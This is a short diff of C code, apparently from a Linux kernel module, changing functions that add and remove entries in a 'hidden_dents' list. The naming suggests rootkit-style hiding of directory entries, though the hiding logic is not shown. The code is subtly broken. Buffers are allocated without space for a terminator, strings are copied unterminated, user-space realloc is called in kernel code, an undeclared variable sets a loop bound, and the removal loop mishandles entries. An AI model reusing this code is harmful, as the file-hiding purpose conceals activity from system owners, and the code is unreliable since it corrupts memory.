@@ -16,7 +16,7 @@ void add_hidden_dent(char *dent)
 	dent_size++;
 	hidden_dents = krealloc(hidden_dents, dent_size*sizeof(char *), GFP_KERNEL);
 	*(hidden_dents + dent_size - 1) = (char *) kmalloc(strlen(dent)*sizeof(char), GFP_KERNEL);
-	strcpy(*(hidden_dents + dent_size - 1), dent);
+	strncpy(*(hidden_dents + dent_size - 1), dent, strlen(dent));
 }
 
 void remove_hidden_dent(char *dent) 
@@ -25,16 +25,20 @@ void remove_hidden_dent(char *dent)
 	int move = 0;
 
 	for (i = 0; i < dent_size; i++) {
-		if ( memcmp(*(hidden_dents + i), dent, strlen(*(hidden_dents + i))) == 0) {
+		if (memcmp(*(hidden_dents + i), dent, strlen(*(hidden_dents + i))) == 0) {
 			move = 1;
-			continue;
 		}
-		*(hidden_dents + i - 1) = *(hidden_dents + i);
+		if (move && i + 1 < mnozstvo_zaznamov) {                                
+			int size = strlen(*(hidden_dents + i + 1));                                   
+			*(hidden_dents + i) = realloc(*(hidden_dents + i), (size + 1)*sizeof(char));          
+			memset(*(hidden_dents + i), 0, (size + 1));                                   
+			strncpy(*(hidden_dents + i), *(hidden_dents + i + 1), size);                          
+		}     
 	}
 
 	if (dent_size > 0 && move) {
 		dent_size--;
-		kfree(*(hidden_dents + dent_size - 1));
+		kfree(*(hidden_dents + dent_size));
 		hidden_dents = krealloc(hidden_dents, dent_size*sizeof(char *), GFP_KERNEL);
 	}
 }
